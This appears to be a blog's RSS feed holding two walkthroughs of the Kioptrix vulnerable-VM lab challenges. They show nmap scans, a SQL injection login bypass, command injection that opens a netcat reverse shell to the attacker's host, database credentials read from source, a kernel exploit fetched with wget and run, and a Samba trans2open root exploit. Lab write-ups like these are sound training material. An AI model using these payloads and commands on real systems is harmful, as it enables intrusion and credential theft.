+      <link>http://rastamouse.me/writeups/2013/kioptrix-level-1-1/</link>
+      <pubDate>Mon, 21 Jan 2013 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2013/kioptrix-level-1-1/</guid>
+      <description>
+
+&lt;p&gt;This is a walkthrough of how I completed Kioptrix Level 1.2.  The goal of the challenge is to obtain the flag.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:9a8c984df175a5e455bd837f325e544a&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/kioptrix/2# nmap -n -sV -A -p- 192.168.1.121
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+|_sshv1: Server supports SSHv1
+80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+111/tcp  open  rpcbind  2 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            822/udp  status
+|_  100024  1            825/tcp  status
+443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-10-07T23:10:47+00:00
+|_Not valid after:  2010-10-07T23:10:47+00:00
+|_ssl-date: 2014-04-24T00:38:09+00:00; +3h59m58s from local time.
+| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+631/tcp  open  ipp      CUPS 1.1
+| http-methods: Potentially risky methods: PUT
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_http-title: 403 Forbidden
+825/tcp  open  status   1 (RPC #100024)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            822/udp  status
+|_  100024  1            825/tcp  status
+3306/tcp open  mysql    MySQL (unauthorized)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;sql-injection-login-bypass:9a8c984df175a5e455bd837f325e544a&#34;&gt;SQL Injection Login Bypass&lt;/h2&gt;
+
+&lt;p&gt;I went and had a look at the Apache service running on port 80, and was greated with a login page.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/kioptrix-1-1/login.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;After a few attempts, I was able to bypass this login page by using SQL Injection.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Username: admin
+Password: &#39; or &#39;1&#39;=&#39;1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This took me to another page, with a ping webapp.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/kioptrix-1-1/ping.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;h2 id=&#34;command-injection:9a8c984df175a5e455bd837f325e544a&#34;&gt;Command Injection&lt;/h2&gt;
+
+&lt;p&gt;Entering &lt;code&gt;127.0.0.1&lt;/code&gt; in this box give me the expected output.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.064 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.051 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.047 ms
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;By inserting a semi-colon &lt;code&gt;;&lt;/code&gt; into the input window, I was able to insert additional commands.  I used this to check for &lt;code&gt;netcat&lt;/code&gt;, then to obtain a remote shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;;/usr/local/bin/nc 192.168.1.120 4444 -e &#39;/bin/bash&#39;
+pwd
+/var/www/html
+ls -la
+total 24
+drwxr-xr-x  2 root root 4096 Oct  8  2009 .
+drwxr-xr-x  8 root root 4096 Oct  7  2009 ..
+-rwxr-Sr-t  1 root root 1733 Feb  9  2012 index.php
+-rwxr-Sr-t  1 root root  199 Oct  8  2009 pingit.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;exploring-mysql:9a8c984df175a5e455bd837f325e544a&#34;&gt;Exploring MySQL&lt;/h2&gt;
+
+&lt;p&gt;I used the shell to read &lt;code&gt;index.php&lt;/code&gt;, which was the original paged used to login, and obtain the username and password it uses to connect to the database.  I spent some time exploring the databases within.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;head index.php
+mysql_connect(&amp;quot;localhost&amp;quot;, &amp;quot;john&amp;quot;, &amp;quot;hiroshima&amp;quot;) or die(mysql_error());
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mysql --user=john --password=hiroshima -e &amp;quot;show databases;&amp;quot;
+mysql --user=john --password=hiroshima -e &amp;quot;use mysql; show tables;&amp;quot;
+mysql --user=john --password=hiroshima -e &amp;quot;use mysql; select * from user;&amp;quot;
+mysql --user=john --password=hiroshima -e &amp;quot;use mysql; select user, password from user;&amp;quot;
+mysql --user=john --password=hiroshima -e &amp;quot;use webapp; show tables;&amp;quot;
+mysql --user=john --password=hiroshima -e &amp;quot;use webapp; select * from users;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;privilege-escalation:9a8c984df175a5e455bd837f325e544a&#34;&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;In the end, I found a local kernel exploit that worked nicely in elevating my shell to root.  I transfered the exploit by hosting it on my own apache server and using &lt;code&gt;wget&lt;/code&gt;.  It was then compiled with &lt;code&gt;gcc&lt;/code&gt; and run.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;wget http://192.168.1.120/x.c -O x.c
+gcc x.c -o x
+./x
+sh-3.00# id
+uid=0(root) gid=0(root) groups=48(apache)
+sh-3.00# cat /root/.mysql_history
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Kioptrix Level 1</title>
+      <link>http://rastamouse.me/writeups/2013/kioptrix-level-1/</link>
+      <pubDate>Sun, 20 Jan 2013 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2013/kioptrix-level-1/</guid>
+      <description>
+
+&lt;p&gt;This is a walkthrough of how I completed Kioptrix Level 1.  The goal is to obtain the flag.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:89aaf23838ef9c8ff34cb30ba3b2c2a1&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- 192.168.1.123
+
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+|_sshv1: Server supports SSHv1
+80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+| http-methods: Potentially risky methods: TRACE
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+111/tcp   open  rpcbind     2 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1          32768/tcp  status
+|_  100024  1          32770/udp  status
+139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp   open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+| http-methods: Potentially risky methods: TRACE
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-09-26T08:32:06+00:00
+|_Not valid after:  2010-09-26T08:32:06+00:00
+|_ssl-date: 2014-04-23T23:02:40+00:00; +3h59m59s from local time.
+| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+32768/tcp open  status      1 (RPC #100024)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1          32768/tcp  status
+|_  100024  1          32770/udp  status
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;smbclient:89aaf23838ef9c8ff34cb30ba3b2c2a1&#34;&gt;SMBClient&lt;/h2&gt;
+
+&lt;p&gt;The nmap scan showed that the Samba service was running, I used SMBClient to establish a NULL session.  This allowed me to see the available shares and the Samba version (2.2.1a).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# smbclient -L \\192.168.1.123 -N
+
+Anonymous login successful
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+     Sharename       Type      Comment
+     ---------       ----      -------
+     IPC$            IPC       IPC Service (Samba Server)
+     ADMIN$          IPC       IPC Service (Samba Server)
+Anonymous login successful
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+     Server               Comment
+     ---------            -------
+     KIOPTRIX             Samba Server
+     Workgroup            Master
+     ---------            -------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is vulnerable to a buffer overflow in the &lt;code&gt;call_trans2open&lt;/code&gt; function in &lt;code&gt;trans2.c&lt;/code&gt;, for which there are many exploits available.  Some are more reliable others however.&lt;/p&gt;
+
+&lt;h2 id=&#34;0x333hate:89aaf23838ef9c8ff34cb30ba3b2c2a1&#34;&gt;0x333hate&lt;/h2&gt;
+
+&lt;p&gt;The exploit which worked well for me was the &lt;code&gt;0x333hate&lt;/code&gt; varient, downloaded from SecurityFocus.  After compiling and running the exploit, I was granted with a root shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/kioptrix/1# ./0x333hate -t 192.168.1.123
+ [~] 0x333hate =&amp;gt; samba 2.2.x remote root exploit [~]
+ [~]        coded by c0wboy ~ www.0x333.org       [~]
+ [-] connecting to 192.168.1.123:139
+ [-] stating bruteforce
+ [-] testing 0xbfffffff
+ [-] testing 0xbffffdff
+ [-] testing 0xbffffbff
+ [-] testing 0xbffff9ff
+ [-] testing 0xbffff7ff
+Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+uid=0(root) gid=0(root) groups=99(nobody)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag:89aaf23838ef9c8ff34cb30ba3b2c2a1&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;p&gt;After searching through the system, I eventually found the flag in &lt;code&gt;/var/spool/mail&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;If you are reading this, you got root. Congratulations.
+Level 2 won&#39;t be as easy...
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
